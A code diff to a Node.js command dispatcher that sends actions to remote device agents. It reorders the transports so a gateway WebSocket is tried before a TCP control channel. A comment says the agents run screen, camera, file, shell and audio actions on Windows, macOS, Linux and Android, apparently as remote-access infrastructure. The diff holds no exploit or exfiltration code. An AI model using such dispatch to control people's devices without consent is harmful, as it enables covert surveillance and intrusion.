@@ -27,9 +27,10 @@ function getGatewaySocket(deviceId, activeConnections) {
 function isCommandReady(deviceId, activeConnections) {
     const id = String(deviceId || '').trim();
     if (!id) return false;
+    if (Boolean(getGatewaySocket(id, activeConnections))) return true;
     const control = getControlAgent(id);
     if (control?.socket && !control.socket.destroyed) return true;
-    return Boolean(getGatewaySocket(id, activeConnections));
+    return false;
 }
 
 function dispatchAgentCommand(deviceId, action, payload = {}, activeConnections) {
@@ -39,25 +40,17 @@ function dispatchAgentCommand(deviceId, action, payload = {}, activeConnections)
 
     const liveLogBus = require('../services/liveLogBus');
 
-    if (sendCommandToAgent(id, act, payload)) {
-        liveLogBus.push({
-            channel: 'agent',
-            level: 'info',
-            message: `[DISPATCH:TCP/Control] Device ${id} ← ${act}`,
-            deviceId: id,
-            meta: { action: act, transport: 'control' }
-        });
-        return { ok: true, transport: 'control' };
-    }
-
+    // 1. Prioritize Gateway WebSocket (where Windows, macOS, Linux, and Android execute screen, camera, files, shell, audio)
     const socket = getGatewaySocket(id, activeConnections);
     if (socket) {
         try {
-            socket.send(JSON.stringify({
+            const outboundPacket = {
                 action: act,
                 payload: payload || {},
+                ...(typeof payload === 'object' && payload !== null ? payload : {}),
                 timestamp: new Date().toISOString(),
-            }));
+            };
+            socket.send(JSON.stringify(outboundPacket));
             liveLogBus.push({
                 channel: 'agent',
                 level: 'info',
@@ -67,8 +60,20 @@ function dispatchAgentCommand(deviceId, action, payload = {}, activeConnections)
             });
             return { ok: true, transport: 'gateway' };
         } catch (_) {
-            // fall through
+            // fall through to control
         }
+    }
+
+    // 2. Fallback to Control Plane (for TCP-only agents or history sync actions)
+    if (sendCommandToAgent(id, act, payload)) {
+        liveLogBus.push({
+            channel: 'agent',
+            level: 'info',
+            message: `[DISPATCH:TCP/Control] Device ${id} ← ${act}`,
+            deviceId: id,
+            meta: { action: act, transport: 'control' }
+        });
+        return { ok: true, transport: 'control' };
     }
 
     liveLogBus.push({
